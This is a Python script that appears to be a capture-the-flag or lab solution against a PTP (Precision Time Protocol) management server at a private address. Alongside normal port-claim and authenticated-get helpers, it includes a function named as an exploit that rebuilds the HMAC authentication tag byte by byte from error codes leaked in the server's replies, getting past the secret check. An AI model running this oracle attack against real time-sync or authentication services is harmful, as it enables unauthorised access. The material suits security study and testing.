import sys
sys.path.append("build")

import socket
import ptp_protocol
import ptp_message
import uuid
import hmac
import hashlib

class PtpManagement:
    SERVER_ADDRESS = "172.21.0.2"
    SERVER_PORT_EVENT = 319
    SERVER_PORT_GENERAL = 320
    BUFFER_SIZE = 1500

    def __init__(self, target_id, target_port, clock_id=uuid.getnode(), port=2):
        self.target_id = target_id
        self.target_port = target_port

        self.clock_id = clock_id
        self.port = port

        self.sequence_number = 0

    def __enter__(self):
        # To be standard compliant we would need two sockets and bind to the assigned ports.
        # However this would lead to issues with the NAT.
        # Also the packets are still dissected by wireshark this way. 
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.settimeout(0.1)

        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.socket.close()

    def send_raw(self, request, event=False):
        port = self.SERVER_PORT_EVENT if event else self.SERVER_PORT_GENERAL
        self.socket.sendto(request, (self.SERVER_ADDRESS, port))

    def send(self, message, event=False):
        request = message.encode(self.BUFFER_SIZE)
        self.send_raw(request, event)

    def receive(self):
        response, server = self.socket.recvfrom(self.BUFFER_SIZE)
        
        message = ptp_message.from_buffer(response)

        if (message.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT):
            raise RuntimeError("Expected management message")

        for tlv in message.get_tlvs():
            if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
                if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                    print("Received user description: {}".format(ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()))
            if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
                print("Received management error: {}".format(ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()))

        return message
    
    def add_auth_tlv(self, message):
        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION)
        tlv.payload.authentication.spp = 0
        tlv.payload.authentication.security_parameter_indicatior = 0
        tlv.payload.authentication.key_id = 0
        tlv.payload.authentication.icv_length = 16

    def claim_port(self, secret, description):
        secret = secret.encode('utf-8')
        if (len(secret) > 100):
            raise ValueError("Secret too large")

        description = description.encode('utf-8')
        if (len(description) > 128):
            raise ValueError("User description too large")
        
        message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, self.clock_id, self.port, self.sequence_number)
        self.sequence_number += 1

        payload = message.get_payload()
        payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
        payload.management.target_port_id.port = self.target_port
        payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_COMMAND
        payload.management.starting_boundary_hops = 0
        payload.management.boundary_hops = 0

        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_IMPLEMENTATION_SPECIFIC_PORT_CLAIM
        ptp_protocol.ffi.memmove(tlv.payload.management.payload.port_claim.port_secret, secret + b'\0', len(secret) + 1)
        ptp_protocol.ffi.memmove(tlv.payload.management.payload.port_claim.user_description, description + b'\0', len(description) + 1)
        
        self.send(message)
        response = self.receive()

    def get_user_description(self, secret):
        secret = secret.encode('utf-8') + b'\x00' * (100 - len(secret))

        message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, self.clock_id, self.port, self.sequence_number)
        self.sequence_number += 1

        payload = message.get_payload()
        payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
        payload.management.target_port_id.port = self.target_port
        payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
        payload.management.starting_boundary_hops = 0
        payload.management.boundary_hops = 0

        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

        self.add_auth_tlv(message)

        request = bytearray(message.encode(self.BUFFER_SIZE))
        icv = hmac.new(secret, request[:-16], hashlib.sha256).digest()
        request[-16:] = icv[:16]
        self.send_raw(request)

        response = self.receive()

    def get_user_description_exploit(self):
        icv = bytearray(16)

        message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, self.clock_id, self.port, self.sequence_number)
        self.sequence_number = 0

        payload = message.get_payload()
        payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
        payload.management.target_port_id.port = self.target_port
        payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
        payload.management.starting_boundary_hops = 0
        payload.management.boundary_hops = 0

        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

        self.add_auth_tlv(message)
        request = bytearray(message.encode(self.BUFFER_SIZE))

        for i in range(len(icv) + 1):
            request[-len(icv):] = icv

            self.send_raw(request)
            response = self.receive()

            if (response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT):
                raise RuntimeError("Expected management message")

            for tlv in response.get_tlvs():
                if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
                    icv[i] = tlv.payload.management_error_status.error_id - 0xc000

def main():
    with PtpManagement(42, 1337) as management:
        print("Claim port")
        management.claim_port("password", "my port")
        print()

        print("Get user description")
        management.get_user_description("password")
        print()

        print("Exploit")
        management.get_user_description_exploit()

if __name__ == "__main__":
    main()

